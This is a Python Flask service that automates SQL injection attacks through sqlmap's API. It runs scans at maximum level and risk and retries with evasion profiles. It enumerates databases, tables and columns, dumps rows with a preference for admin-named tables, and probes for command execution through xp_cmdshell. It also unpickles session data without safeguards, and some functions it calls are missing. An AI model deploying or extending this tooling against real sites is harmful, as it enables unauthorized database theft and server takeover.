import argparse
import base64
import hashlib
import json
import os
import pickle
import secrets
import sqlite3
import struct
import threading
import time
from functools import wraps

import requests
from flask import Flask, jsonify, request

parser = argparse.ArgumentParser()
parser.add_argument("--sqlmapapi-port", type=int, default=None)
parser.add_argument("--flask-port", type=int, default=5000)
parser.add_argument("--api-token", default=None)
parser.add_argument("--max-concurrent", type=int, default=10)
args, _ = parser.parse_known_args()

app = Flask(__name__)

SQLMAPAPI_PORT = args.sqlmapapi_port or int(os.getenv("SQLMAPAPI_PORT", "8775"))
SQLMAPAPI_HOST = os.getenv("SQLMAPAPI_HOST", "127.0.0.1")
OUTPUT_DIR = os.getenv("OUTPUT_DIR", "/app/output")
MAX_CONCURRENT_SCANS = args.max_concurrent or int(os.getenv("MAX_CONCURRENT_SCANS", "10"))
API_TOKEN = args.api_token or os.getenv("API_TOKEN", secrets.token_hex(16))
FLASK_PORT = args.flask_port or int(os.getenv("FLASK_PORT", "5000"))
DEFAULT_POLL_SECONDS = 5
SESSION_FILE_NAME = "session.sqlite"
METADATA_FILE_NAME = "record.json"
DEFAULT_SQLMAP_LEVEL = 5
DEFAULT_SQLMAP_RISK = 3
DEFAULT_SQLMAP_THREADS = 4
DEFAULT_SQLMAP_TIMEOUT = 20
DEFAULT_SQLMAP_RETRIES = 4
AGENT_VERSION = "2.3.0"

ENUM_ACTIONS = {
    "get_current_db",
    "get_dbs",
    "get_tables",
    "get_columns",
    "dump_first_row",
    "dump_table_data",
    "search_column",
}

ENUMERATION_FALLBACK_PROFILES = [
    {
        "name": "default",
        "label": "aggressive-default",
        "options": {},
    },
    {
        "name": "no_cast",
        "label": "retry-no-cast",
        "options": {
            "noCast": True,
            "freshQueries": True,
            "threads": 1,
        },
    },
    {
        "name": "hex",
        "label": "retry-hex",
        "options": {
            "hexConvert": True,
            "freshQueries": True,
            "threads": 1,
        },
    },
    {
        "name": "unstable",
        "label": "retry-unstable-no-escape",
        "options": {
            "freshQueries": True,
            "noEscape": True,
            "unstable": True,
            "threads": 1,
            "timeout": 30,
            "retries": 6,
        },
    },
]

CONTENT_TYPE_NAMES = {
    0: "target",
    1: "techniques",
    2: "dbms_fingerprint",
    3: "banner",
    4: "current_user",
    5: "current_db",
    6: "hostname",
    7: "is_dba",
    8: "users",
    9: "passwords",
    10: "privileges",
    11: "roles",
    12: "dbs",
    13: "tables",
    14: "columns",
    15: "schema",
    16: "count",
    17: "dump_table",
    18: "search",
    19: "sql_query",
    20: "common_tables",
    21: "common_columns",
    22: "file_read",
    23: "file_write",
    24: "os_cmd",
    25: "reg_read",
    26: "statements",
}

TECHNIQUE_NAMES = {
    "1": "boolean-based blind",
    "2": "error-based",
    "3": "inline query",
    "4": "stacked queries",
    "5": "time-based blind",
    "6": "UNION query",
    1: "boolean-based blind",
    2: "error-based",
    3: "inline query",
    4: "stacked queries",
    5: "time-based blind",
    6: "UNION query",
}

HASHDB_KEYS = {
    "dbms": "DBMS",
    "os": "OS",
    "xp_cmdshell_available": "KB_XP_CMDSHELL_AVAILABLE",
    "injections": "KB_INJECTIONS",
}

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

http_session = requests.Session()
task_queue = []
running_tasks = {}
scan_records = {}
queue_lock = threading.Lock()


def sqlmapapi_base():
    return f"http://{SQLMAPAPI_HOST}:{SQLMAPAPI_PORT}"


def now_ts():
    return int(time.time())


def metadata_file_path(scan_root):
    return os.path.join(scan_root, METADATA_FILE_NAME)


def record_defaults(record):
    record.setdefault("active_task_id", record.get("root_task_id"))
    record.setdefault("status", "queued")
    record.setdefault("phase", "queued")
    record.setdefault("latest_action", "initial_scan")
    record.setdefault("last_error", "")
    record.setdefault("created_at", now_ts())
    record.setdefault("updated_at", now_ts())
    record.setdefault("history", [])
    record.setdefault("cached_content", {})
    record.setdefault("automation", {"enabled": True, "completed": []})
    record.setdefault("shell_probe", {"status": "unknown", "message": ""})
    record.setdefault("proxy", "")
    record.setdefault("runtime_proxy", "")
    record.setdefault("runtime_proxy_file", "")
    return record


def persist_record_metadata(record):
    scan_root = (record or {}).get("scan_root")
    root_task_id = (record or {}).get("root_task_id")
    if not scan_root or not root_task_id:
        return
    payload = {
        "root_task_id": root_task_id,
        "active_task_id": record.get("active_task_id", root_task_id),
        "domain": record.get("domain", ""),
        "vuln_id": record.get("vuln_id", ""),
        "request_file": record.get("request_file", ""),
        "scan_root": scan_root,
        "force_ssl": bool(record.get("force_ssl", False)),
        "status": record.get("status", "queued"),
        "phase": record.get("phase", "queued"),
        "latest_action": record.get("latest_action", "initial_scan"),
        "last_error": record.get("last_error", ""),
        "created_at": int(record.get("created_at") or now_ts()),
        "updated_at": int(record.get("updated_at") or now_ts()),
        "history": record.get("history", []),
        "automation": record.get("automation", {"enabled": True, "completed": []}),
        "shell_probe": record.get("shell_probe", {"status": "unknown", "message": ""}),
        "proxy": record.get("proxy", ""),
        "runtime_proxy": record.get("runtime_proxy", ""),
        "runtime_proxy_file": record.get("runtime_proxy_file", ""),
    }
    path = metadata_file_path(scan_root)
    temp_path = f"{path}.tmp"
    try:
        os.makedirs(scan_root, exist_ok=True)
        with open(temp_path, "wt", encoding="utf8", newline="\n") as file_handle:
            json.dump(payload, file_handle, ensure_ascii=False, indent=2)
        os.replace(temp_path, path)
    except Exception:
        pass


def recover_scan_records():
    scans_root = os.path.join(OUTPUT_DIR, "scans")
    if not os.path.isdir(scans_root):
        return
    for entry in os.listdir(scans_root):
        scan_root = os.path.join(scans_root, entry)
        if not os.path.isdir(scan_root):
            continue
        meta_path = metadata_file_path(scan_root)
        if not os.path.isfile(meta_path):
            continue
        try:
            with open(meta_path, "rt", encoding="utf8") as file_handle:
                payload = json.load(file_handle)
        except Exception:
            continue
        root_task_id = str(payload.get("root_task_id") or "").strip()
        if not root_task_id:
            continue
        payload["scan_root"] = payload.get("scan_root") or scan_root
        payload["request_file"] = payload.get("request_file") or os.path.join(payload["scan_root"], "request.txt")
        scan_records[root_task_id] = record_defaults(payload)


def sanitize_path_component(value):
    result = []
    for char in value or "":
        if char.isalnum() or char in ("-", "_", "."):
            result.append(char)
        else:
            result.append("_")
    return "".join(result).strip("._") or "scan"


def sqlmap_request(method, path, payload=None, timeout=15):
    headers = {"Content-Type": "application/json"}
    url = f"{sqlmapapi_base()}{path}"
    response = http_session.request(method, url, json=payload, headers=headers, timeout=timeout)
    response.raise_for_status()
    if not response.text:
        return {}
    return response.json()


def require_auth(func):
    @wraps(func)
    def decorated(*args_, **kwargs_):
        token = request.headers.get("X-Api-Token")
        if token != API_TOKEN:
            return jsonify({"error": "Unauthorized"}), 401
        return func(*args_, **kwargs_)

    return decorated


def create_record(root_task_id, domain, vuln_id, request_file, scan_root, force_ssl):
    record = record_defaults(
        {
        "root_task_id": root_task_id,
        "active_task_id": root_task_id,
        "domain": domain,
        "vuln_id": vuln_id,
        "request_file": request_file,
        "scan_root": scan_root,
        "force_ssl": force_ssl,
        "status": "queued",
        "phase": "queued",
        "latest_action": "initial_scan",
        "last_error": "",
        "created_at": now_ts(),
        "updated_at": now_ts(),
        "history": [],
        "cached_content": {},
        "automation": {
            "enabled": True,
            "completed": [],
        },
        "shell_probe": {
            "status": "unknown",
            "message": "",
        },
        "proxy": "",
        "runtime_proxy": "",
        "runtime_proxy_file": "",
    }
    )
    scan_records[root_task_id] = record
    persist_record_metadata(record)
    return record


def find_shared_record_by_domain(domain, proxy, force_ssl):
    domain = (domain or "").strip().lower()
    if not domain:
        return None
    proxy = (proxy or "").strip()
    target = None
    target_ts = -1
    for record in scan_records.values():
        if (record.get("domain") or "").strip().lower() != domain:
            continue
        if bool(record.get("force_ssl", False)) != bool(force_ssl):
            continue
        if (record.get("proxy") or "").strip() != proxy:
            continue
        ts = int(record.get("updated_at") or 0)
        if ts > target_ts:
            target_ts = ts
            target = record
    return target


def queue_job(root_task_id, sqlmap_task_id, scan_data, action, action_args=None):
    job = {
        "root_task_id": root_task_id,
        "sqlmap_task_id": sqlmap_task_id,
        "scan_data": scan_data,
        "action": action,
        "action_args": action_args or {},
        "created_at": now_ts(),
    }

    with queue_lock:
        if root_task_id in running_tasks:
            return False, "Task is already running", None

        for queued in task_queue:
            if queued["root_task_id"] == root_task_id:
                return False, "Task is already queued", None

        task_queue.append(job)
        record = scan_records[root_task_id]
        record["status"] = "queued"
        record["phase"] = f"queued:{action}"
        record["latest_action"] = action
        record["updated_at"] = now_ts()
        persist_record_metadata(record)

    process_next_in_queue()
    queued = root_task_id not in running_tasks
    return True, "Task queued" if queued else "Task started", job


def process_next_in_queue():
    started_jobs = []
    with queue_lock:
        while len(running_tasks) < MAX_CONCURRENT_SCANS and task_queue:
            job = task_queue.pop(0)
            root_task_id = job["root_task_id"]
            running_tasks[root_task_id] = {
                "status": "running",
                "action": job["action"],
                "sqlmap_task_id": job["sqlmap_task_id"],
                "action_args": job.get("action_args", {}),
                "started_at": now_ts(),
            }
            record = scan_records.get(root_task_id)
            if record:
                record["status"] = "running"
                record["phase"] = f"running:{job['action']}"
                record["latest_action"] = job["action"]
                record["active_task_id"] = job["sqlmap_task_id"]
                record["updated_at"] = now_ts()
                persist_record_metadata(record)
            started_jobs.append(job)

    for job in started_jobs:
        thread = threading.Thread(target=start_sqlmap_task, args=(job,))
        thread.daemon = True
        thread.start()


def start_sqlmap_task(job):
    root_task_id = job["root_task_id"]
    sqlmap_task_id = job["sqlmap_task_id"]
    action = job["action"]
    return_code = None
    error_message = ""

    try:
        start_res = sqlmap_request("POST", f"/scan/{sqlmap_task_id}/start", payload=job["scan_data"])
        if not start_res.get("success", True):
            error_message = start_res.get("message", "Failed to start sqlmap task")
        else:
            refresh_runtime_proxy(root_task_id)
            while True:
                status_res = sqlmap_request("GET", f"/scan/{sqlmap_task_id}/status")
                status = status_res.get("status", "unknown")
                return_code = status_res.get("returncode")
                with queue_lock:
                    if root_task_id in running_tasks:
                        running_tasks[root_task_id]["status"] = status
                    record = scan_records.get(root_task_id)
                    if record:
                        record["status"] = status
                        record["phase"] = derive_phase(record, action)
                        record["updated_at"] = now_ts()
                        persist_record_metadata(record)
                if status in ("terminated", "not running"):
                    break
                time.sleep(DEFAULT_POLL_SECONDS)
    except Exception as ex:
        error_message = str(ex)
    finally:
        finalize_job(root_task_id, sqlmap_task_id, action, error_message, return_code)


def finalize_job(root_task_id, sqlmap_task_id, action, error_message, return_code):
    snapshot = build_scan_snapshot(root_task_id, include_logs=False)
    record = scan_records.get(root_task_id)
    action_args = {}
    with queue_lock:
        running_info = running_tasks.get(root_task_id, {})
        if running_info.get("action") == action:
            action_args = dict(running_info.get("action_args") or {})

    fallback_job = build_empty_result_fallback_job(root_task_id, action, action_args, snapshot)
    if record:
        record["updated_at"] = now_ts()
        if error_message:
            record["last_error"] = error_message
            record["status"] = "failed"
        else:
            record["status"] = snapshot.get("status", "terminated")
            if not fallback_job:
                record["last_error"] = ""
        record["phase"] = snapshot.get("phase", derive_phase(record, action))
        record["history"].append(
            {
                "action": action,
                "sqlmap_task_id": sqlmap_task_id,
                "status": record["status"],
                "return_code": return_code,
                "error": error_message,
                "fallback_index": action_args.get("fallback_index", 0),
                "fallback_profile": get_fallback_profile(action_args.get("fallback_index", 0)).get("name"),
                "finished_at": now_ts(),
            }
        )
        if action == "probe_shell":
            record["shell_probe"] = derive_shell_probe(snapshot)
        if fallback_job:
            profile = get_fallback_profile(fallback_job["action_args"].get("fallback_index", 0))
            record["last_error"] = f"Enumeration returned empty result, retrying with {profile.get('label')}"
        elif action not in record["automation"]["completed"]:
            record["automation"]["completed"].append(action)
        persist_record_metadata(record)

    with queue_lock:
        if root_task_id in running_tasks:
            del running_tasks[root_task_id]

    if fallback_job:
        ok, _, _ = queue_job(
            root_task_id=fallback_job["root_task_id"],
            sqlmap_task_id=fallback_job["sqlmap_task_id"],
            scan_data=fallback_job["scan_data"],
            action=fallback_job["action"],
            action_args=fallback_job["action_args"],
        )
        if ok:
            process_next_in_queue()
            return

    next_job = build_next_automation_job(root_task_id, snapshot)
    if next_job:
        ok, _, _ = queue_job(
            root_task_id=next_job["root_task_id"],
            sqlmap_task_id=next_job["sqlmap_task_id"],
            scan_data=next_job["scan_data"],
            action=next_job["action"],
            action_args=next_job["action_args"],
        )
        if ok:
            process_next_in_queue()
            return

    process_next_in_queue()


def derive_phase(record, action):
    if record["status"] == "queued":
        return f"queued:{action}"
    if action == "initial_scan":
        return "detecting_injection"
    return action


def get_request_output_root(record):
    for root, _, files in os.walk(record["scan_root"]):
        if SESSION_FILE_NAME in files:
            return root
    return None


def hash_key(key):
    digest = hashlib.md5((key if isinstance(key, bytes) else str(key).encode("utf8", errors="ignore"))).digest()
    return struct.unpack("<Q", digest[:8])[0] & 0x7FFFFFFFFFFFFFFF


def session_query_value(session_file, key):
    if not session_file or not os.path.exists(session_file):
        return None
    conn = sqlite3.connect(session_file)
    try:
        row = conn.execute("SELECT value FROM storage WHERE id = ?", (hash_key(key),)).fetchone()
        return row[0] if row else None
    finally:
        conn.close()


def safe_unpickle(value):
    if not value:
        return None
    try:
        return pickle.loads(base64.b64decode(value))
    except Exception:
        return None


def find_session_file(record):
    for root, _, files in os.walk(record["scan_root"]):
        if SESSION_FILE_NAME in files:
            return os.path.join(root, SESSION_FILE_NAME)
    return None


def find_dump_sqlite_files(record):
    results = []
    for root, _, files in os.walk(record["scan_root"]):
        for filename in files:
            if filename.endswith(".sqlite3"):
                results.append(os.path.join(root, filename))
    return sorted(results)


def read_text_file(path, max_size=2 * 1024 * 1024):
    if not path or not os.path.exists(path):
        return ""
    try:
        if os.path.getsize(path) > max_size:
            return ""
        with open(path, "rt", encoding="utf8", errors="replace") as file_handle:
            return file_handle.read()
    except Exception:
        return ""


def read_dump_sqlite_file(path):
    database_name = os.path.splitext(os.path.basename(path))[0]
    conn = sqlite3.connect(path)
    conn.row_factory = sqlite3.Row
    try:
        tables = []
        preview = {}
        table_rows = conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").fetchall()
        for row in table_rows:
            table_name = row["name"]
            tables.append(table_name)
            columns = [item["name"] for item in conn.execute(f"PRAGMA table_info('{table_name}')").fetchall()]
            sample_rows = []
            for data_row in conn.execute(f"SELECT * FROM '{table_name}' LIMIT 10").fetchall():
                sample_rows.append(dict(data_row))
            preview[table_name] = {
                "columns": columns,
                "rows": sample_rows,
            }
        return {
            "database": database_name,
            "tables": tables,
            "preview": preview,
            "path": path,
        }
    finally:
        conn.close()


def normalize_techniques(raw_value):
    techniques = []
    if not isinstance(raw_value, list):
        return techniques
    for item in raw_value:
        data = item.get("data", {}) if isinstance(item, dict) else {}
        entries = []
        for key, value in data.items():
            if not isinstance(value, dict):
                continue
            entries.append(
                {
                    "type": TECHNIQUE_NAMES.get(key, str(key)),
                    "title": value.get("title", ""),
                    "payload": value.get("payload", ""),
                    "vector": value.get("vector", ""),
                    "where": value.get("where", ""),
                }
            )
        techniques.append(
            {
                "place": item.get("place"),
                "parameter": item.get("parameter"),
                "dbms": item.get("dbms"),
                "os": item.get("os"),
                "entries": entries,
                "raw": item,
            }
        )
    return techniques


def normalize_current_db(raw_value):
    if isinstance(raw_value, str):
        value = raw_value.strip()
        return value if value else ""
    if isinstance(raw_value, list):
        for item in raw_value:
            value = normalize_current_db(item)
            if value:
                return value
    if isinstance(raw_value, dict):
        for value in raw_value.values():
            parsed = normalize_current_db(value)
            if parsed:
                return parsed
    return ""


def normalize_dbs(raw_value):
    values = []
    if isinstance(raw_value, str):
        value = raw_value.strip()
        if value:
            values.append(value)
    elif isinstance(raw_value, list):
        for item in raw_value:
            values.extend(normalize_dbs(item))
    elif isinstance(raw_value, dict):
        for value in raw_value.values():
            values.extend(normalize_dbs(value))
    dedup = []
    seen = set()
    for item in values:
        key = item.lower()
        if key in seen:
            continue
        seen.add(key)
        dedup.append(item)
    return dedup


def normalize_tables(raw_value):
    if isinstance(raw_value, dict):
        out = {}
        for db_name, table_values in raw_value.items():
            db_key = str(db_name or "").strip()
            if not db_key:
                continue
            out[db_key] = normalize_dbs(table_values)
        return out
    return {}


def normalize_columns(raw_value):
    if not isinstance(raw_value, dict):
        return {}
    out = {}
    for db_name, table_map in raw_value.items():
        db_key = str(db_name or "").strip()
        if not db_key or not isinstance(table_map, dict):
            continue
        out[db_key] = {}
        for table_name, column_map in table_map.items():
            table_key = str(table_name or "").strip()
            if not table_key:
                continue
            if isinstance(column_map, dict):
                out[db_key][table_key] = dict(column_map)
            elif isinstance(column_map, list):
                out[db_key][table_key] = {str(name): "" for name in normalize_dbs(column_map)}
    return out


def normalize_scan_data(data_rows):
    by_type = {}
    for item in data_rows or []:
        type_name = CONTENT_TYPE_NAMES.get(item.get("type"), f"type_{item.get('type')}")
        by_type[type_name] = item.get("value")

    current_db = normalize_current_db(by_type.get("current_db"))
    dbs = normalize_dbs(by_type.get("dbs"))
    tables = normalize_tables(by_type.get("tables"))
    columns = normalize_columns(by_type.get("columns"))
    if current_db and current_db not in dbs:
        dbs = [current_db] + dbs

    return {
        "target": by_type.get("target"),
        "techniques": normalize_techniques(by_type.get("techniques")),
        "dbms_fingerprint": by_type.get("dbms_fingerprint"),
        "banner": by_type.get("banner"),
        "current_user": by_type.get("current_user"),
        "current_db": current_db,
        "hostname": by_type.get("hostname"),
        "is_dba": by_type.get("is_dba"),
        "dbs": dbs,
        "tables": tables,
        "columns": columns,
        "count": by_type.get("count"),
        "dump_table": by_type.get("dump_table"),
        "os_cmd": by_type.get("os_cmd"),
        "raw": by_type,
    }


def merge_content(previous, current):
    merged = dict(previous or {})
    for key, value in (current or {}).items():
        if key == "raw":
            raw = dict(previous.get("raw", {}) if isinstance(previous, dict) else {})
            raw.update(value or {})
            merged["raw"] = raw
            continue
        if value not in (None, "", [], {}):
            merged[key] = value
        elif key not in merged:
            merged[key] = value
    return merged


def choose_priority_table(table_names):
    if not table_names:
        return None
    ordered = sorted(table_names)
    for table_name in ordered:
        if "adm" in str(table_name).lower():
            return table_name
    return ordered[0]


def build_tree(content, dump_files):
    tree = {"databases": []}
    database_map = {}

    def ensure_database(name):
        db_name = name or "current"
        if db_name not in database_map:
            database_map[db_name] = {
                "name": db_name,
                "tables": [],
                "_table_map": {},
            }
        return database_map[db_name]

    def ensure_table(database, table_name):
        if table_name not in database["_table_map"]:
            database["_table_map"][table_name] = {
                "name": table_name,
                "columns": [],
                "column_types": {},
                "rows": [],
            }
        return database["_table_map"][table_name]

    dbs = content.get("dbs")
    if isinstance(dbs, list):
        for db_name in dbs:
            if isinstance(db_name, str) and db_name.strip():
                ensure_database(db_name.strip())
    current_db = content.get("current_db")
    if isinstance(current_db, str) and current_db.strip():
        ensure_database(current_db.strip())

    tables = content.get("tables")
    if isinstance(tables, dict):
        for db_name, table_list in tables.items():
            database = ensure_database(db_name)
            if isinstance(table_list, list):
                for table_name in table_list:
                    ensure_table(database, table_name)

    columns = content.get("columns")
    if isinstance(columns, dict):
        for db_name, table_map in columns.items():
            database = ensure_database(db_name)
            if not isinstance(table_map, dict):
                continue
            for table_name, column_map in table_map.items():
                table = ensure_table(database, table_name)
                if isinstance(column_map, dict):
                    table["column_types"] = column_map
                    table["columns"] = sorted(column_map.keys())

    counts = content.get("count")
    if isinstance(counts, dict):
        for db_name, table_map in counts.items():
            database = ensure_database(db_name)
            if not isinstance(table_map, dict):
                continue
            for table_name, count_value in table_map.items():
                table = ensure_table(database, table_name)
                try:
                    table["row_count"] = int(count_value)
                except Exception:
                    table["row_count"] = count_value

    for dump_file in dump_files or []:
        database = ensure_database(dump_file.get("database"))
        preview = dump_file.get("preview", {})
        for table_name, table_preview in preview.items():
            table = ensure_table(database, table_name)
            preview_columns = table_preview.get("columns", [])
            if preview_columns:
                table["columns"] = preview_columns
            if table_preview.get("rows"):
                table["rows"] = table_preview["rows"]

    databases = []
    for database in database_map.values():
        table_names = list(database["_table_map"].keys())
        priority_table = choose_priority_table(table_names)
        tables_list = []
        for table_name in sorted(table_names):
            table = database["_table_map"][table_name]
            table["priority"] = table_name == priority_table
            tables_list.append(table)
        databases.append(
            {
                "name": database["name"],
                "priority_table": priority_table,
                "tables": tables_list,
            }
        )

    databases.sort(key=lambda item: item["name"])
    tree["databases"] = databases
    return tree


def build_search_results(tree, term, kind_filter=""):
    results = []
    needle = (term or "").strip().lower()
    kind_filter = (kind_filter or "").strip().lower()
    if not needle:
        return results

    def include(kind_name):
        return not kind_filter or kind_filter == kind_name

    for database in tree.get("databases", []):
        db_name = database.get("name", "")
        if include("database") and needle in db_name.lower():
            results.append({"kind": "database", "database": db_name, "table": "", "column": "", "value": db_name})
        for table in database.get("tables", []):
            table_name = table.get("name", "")
            if include("table") and needle in table_name.lower():
                results.append({"kind": "table", "database": db_name, "table": table_name, "column": "", "value": table_name})
            for column in table.get("columns", []):
                if needle in str(column).lower():
                    if include("column"):
                        results.append({"kind": "column", "database": db_name, "table": table_name, "column": column, "value": column})
            for row in table.get("rows", []):
                for column_name, column_value in row.items():
                    if include("data") and needle in str(column_value).lower():
                        results.append(
                            {
                                "kind": "data",
                                "database": db_name,
                                "table": table_name,
                                "column": column_name,
                                "value": str(column_value),
                            }
                        )
    return results[:200]


def derive_shell_probe(snapshot):
    logs = [entry.get("message", "") for entry in snapshot.get("logs", [])]
    errors = snapshot.get("errors", [])
    session = snapshot.get("session", {})
    xp_cmdshell = session.get("xp_cmdshell_available")
    if xp_cmdshell is True:
        return {"ok": True, "status": "available", "message": "xp_cmdshell detected"}
    joined = " ".join(logs + [str(item) for item in errors]).lower()
    if any(token in joined for token in ("os cmd", "command execution", "xp_cmdshell")) and "not possible" not in joined:
        return {"ok": False, "status": "possible", "message": "sqlmap reported command execution capability"}
    if "not possible" in joined or "unable" in joined or errors:
        return {"ok": False, "status": "failed", "message": errors[0] if errors else "command execution probe failed"}
    return {"ok": False, "status": "unknown", "message": ""}


def derive_status_from_snapshot(snapshot):
    if snapshot.get("running"):
        return "running"
    if snapshot.get("queued"):
        return "queued"
    if snapshot.get("errors"):
        return "failed"
    if snapshot.get("content", {}).get("techniques"):
        return "completed"
    return snapshot.get("sqlmap_status", "terminated")


def derive_human_phase(snapshot):
    content = snapshot.get("content", {})
    if snapshot.get("running"):
        return f"running:{snapshot.get('latest_action', 'scan')}"
    if content.get("dump_table"):
        return "dump_completed"
    if content.get("columns"):
        return "columns_enumerated"
    if content.get("tables"):
        return "tables_enumerated"
    if content.get("dbs"):
        return "databases_enumerated"
    if content.get("current_db"):
        return "current_database_identified"
    if content.get("techniques"):
        return "injection_confirmed"
    return snapshot.get("phase", "detecting_injection")


def build_scan_snapshot(root_task_id, include_logs=True):
    record = scan_records.get(root_task_id)
    if not record:
        return {"error": "Task not found"}

    active_task_id = record["active_task_id"]
    status_res = {}
    data_res = {}
    logs_res = {}
    try:
        status_res = sqlmap_request("GET", f"/scan/{active_task_id}/status")
    except Exception as ex:
        status_res = {"status": "unreachable", "error": str(ex)}
    try:
        data_res = sqlmap_request("GET", f"/scan/{active_task_id}/data")
    except Exception as ex:
        data_res = {"data": [], "error": [str(ex)]}
    if include_logs:
        try:
            logs_res = sqlmap_request("GET", f"/scan/{active_task_id}/log")
        except Exception:
            logs_res = {"log": []}

    session_file = find_session_file(record)
    serialized_injections = session_query_value(session_file, HASHDB_KEYS["injections"])
    dump_files = [read_dump_sqlite_file(path) for path in find_dump_sqlite_files(record)]
    content = normalize_scan_data(data_res.get("data", []))
    content = merge_content(record.get("cached_content", {}), content)
    session_state = {
        "session_file": session_file,
        "dbms": session_query_value(session_file, HASHDB_KEYS["dbms"]),
        "os": session_query_value(session_file, HASHDB_KEYS["os"]),
        "xp_cmdshell_available": parse_bool(session_query_value(session_file, HASHDB_KEYS["xp_cmdshell_available"])),
        "serialized_injections_available": bool(serialized_injections),
    }

    if not content["techniques"]:
        content["techniques"] = normalize_techniques(safe_unpickle(serialized_injections))
    record["cached_content"] = merge_content(record.get("cached_content", {}), content)

    snapshot = {
        "task_id": root_task_id,
        "current_sqlmap_task_id": active_task_id,
        "status": record.get("status"),
        "sqlmap_status": status_res.get("status"),
        "return_code": status_res.get("returncode"),
        "running": root_task_id in running_tasks,
        "queued": any(item["root_task_id"] == root_task_id for item in task_queue),
        "latest_action": record.get("latest_action"),
        "created_at": record.get("created_at"),
        "updated_at": record.get("updated_at"),
        "domain": record.get("domain"),
        "vuln_id": record.get("vuln_id"),
        "request_file": record.get("request_file"),
        "request_content": read_text_file(record.get("request_file")),
        "scan_root": record.get("scan_root"),
        "force_ssl": record.get("force_ssl"),
        "last_error": record.get("last_error"),
        "content": content,
        "session": session_state,
        "dump_files": dump_files,
        "errors": [item[0] if isinstance(item, list) else item for item in data_res.get("error", [])],
        "logs": logs_res.get("log", []),
        "history": record.get("history", []),
        "automation": record.get("automation", {}),
        "shell_probe": record.get("shell_probe", {}),
        "requested_proxy": record.get("proxy", ""),
        "runtime_proxy": record.get("runtime_proxy", ""),
        "runtime_proxy_file": record.get("runtime_proxy_file", ""),
    }
    snapshot["tree"] = build_tree(content, dump_files)
    snapshot["search_results"] = []
    snapshot["status"] = derive_status_from_snapshot(snapshot)
    snapshot["phase"] = derive_human_phase(snapshot)
    return snapshot


def parse_bool(value):
    if value is None:
        return None
    if isinstance(value, bool):
        return value
    return str(value).strip().lower() in ("1", "true", "yes")


def get_first_database(snapshot):
    content = snapshot.get("content", {})
    current_db = content.get("current_db")
    if isinstance(current_db, str) and current_db:
        return current_db
    dbs = content.get("dbs")
    if isinstance(dbs, list) and dbs:
        return dbs[0]
    tables = content.get("tables")
    if isinstance(tables, dict) and tables:
        return next(iter(tables.keys()))
    for dump_file in snapshot.get("dump_files", []):
        if dump_file.get("database"):
            return dump_file["database"]
    return None


def get_first_table(snapshot, database_name):
    if not database_name:
        return None
    tables = snapshot.get("content", {}).get("tables")
    if isinstance(tables, dict):
        table_list = tables.get(database_name) or []
        if table_list:
            return choose_priority_table(table_list)
    for dump_file in snapshot.get("dump_files", []):
        if dump_file.get("database") == database_name and dump_file.get("tables"):
            return choose_priority_table(dump_file["tables"])
    return None


def has_columns_for_table(snapshot, database_name, table_name):
    columns = snapshot.get("content", {}).get("columns")
    if not isinstance(columns, dict):
        return False
    db_tables = columns.get(database_name) or {}
    table_columns = db_tables.get(table_name)
    return isinstance(table_columns, dict) and bool(table_columns)


def has_dump_preview(snapshot, database_name, table_name):
    for dump_file in snapshot.get("dump_files", []):
        if dump_file.get("database") != database_name:
            continue
        preview = dump_file.get("preview", {}).get(table_name, {})
        if preview.get("rows"):
            return True
    return False


def get_fallback_profile(index):
    try:
        normalized = int(index or 0)
    except (TypeError, ValueError):
        normalized = 0
    normalized = max(0, min(normalized, len(ENUMERATION_FALLBACK_PROFILES) - 1))
    return ENUMERATION_FALLBACK_PROFILES[normalized]


def action_has_meaningful_result(snapshot, action, action_args):
    content = snapshot.get("content", {})
    database_name = action_args.get("db") or get_first_database(snapshot)
    table_name = action_args.get("table") or get_first_table(snapshot, database_name)

    if action == "get_current_db":
        return bool(content.get("current_db"))
    if action == "get_dbs":
        return isinstance(content.get("dbs"), list) and bool(content.get("dbs"))
    if action == "get_tables":
        tables = content.get("tables")
        if not isinstance(tables, dict):
            return False
        if database_name:
            return bool(tables.get(database_name))
        return any(bool(value) for value in tables.values())
    if action == "get_columns":
        return bool(database_name and table_name and has_columns_for_table(snapshot, database_name, table_name))
    if action in ("dump_first_row", "dump_table_data"):
        return bool(database_name and table_name and has_dump_preview(snapshot, database_name, table_name))
    return True


def build_empty_result_fallback_job(root_task_id, action, action_args, snapshot):
    if action not in ENUM_ACTIONS:
        return None
    if action_has_meaningful_result(snapshot, action, action_args):
        return None

    current_index = int(action_args.get("fallback_index") or 0)
    next_index = current_index + 1
    if next_index >= len(ENUMERATION_FALLBACK_PROFILES):
        return None

    next_args = dict(action_args or {})
    next_args["fallback_index"] = next_index
    next_args["db"] = next_args.get("db") or get_first_database(snapshot)
    next_args["table"] = next_args.get("table") or get_first_table(snapshot, next_args.get("db"))
    return build_automation_job(root_task_id, action, next_args)


def create_follow_up_sqlmap_task():
    new_task_res = sqlmap_request("GET", "/task/new")
    task_id = new_task_res.get("taskid")
    if not task_id:
        raise RuntimeError("Failed to allocate sqlmap task")
    return task_id


def parse_sqlmap_config(content):
    result = {}
    for raw_line in (content or "").splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or line.startswith(";"):
            continue
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        result[key.strip().lower()] = value.strip()
    return result


def find_runtime_sqlmap_config(record):
    request_file = os.path.abspath(record.get("request_file", ""))
    scan_root = os.path.abspath(record.get("scan_root", ""))
    if not request_file and not scan_root:
        return "", ""

    candidates = []
    for root in ("/tmp", "/var/tmp"):
        if not os.path.isdir(root):
            continue
        try:
            for name in os.listdir(root):
                if not name.startswith("sqlmapconfig-"):
                    continue
                path = os.path.join(root, name)
                if os.path.isfile(path):
                    candidates.append(path)
        except Exception:
            continue

    candidates.sort(key=lambda item: os.path.getmtime(item), reverse=True)
    for path in candidates:
        content = read_text_file(path, max_size=256 * 1024)
        if not content:
            continue
        parsed = parse_sqlmap_config(content)
        req_val = os.path.abspath(parsed.get("requestfile", ""))
        out_val = os.path.abspath(parsed.get("outputdir", ""))
        if request_file and req_val == request_file:
            return path, content
        if scan_root and out_val.startswith(scan_root):
            return path, content
    return "", ""


def refresh_runtime_proxy(root_task_id):
    record = scan_records.get(root_task_id)
    if not record:
        return
    cfg_file, cfg_content = find_runtime_sqlmap_config(record)
    runtime_proxy = ""
    if cfg_content:
        parsed = parse_sqlmap_config(cfg_content)
        runtime_proxy = parsed.get("proxy", "") or ""
    record["runtime_proxy"] = runtime_proxy
    record["runtime_proxy_file"] = cfg_file
    persist_record_metadata(record)


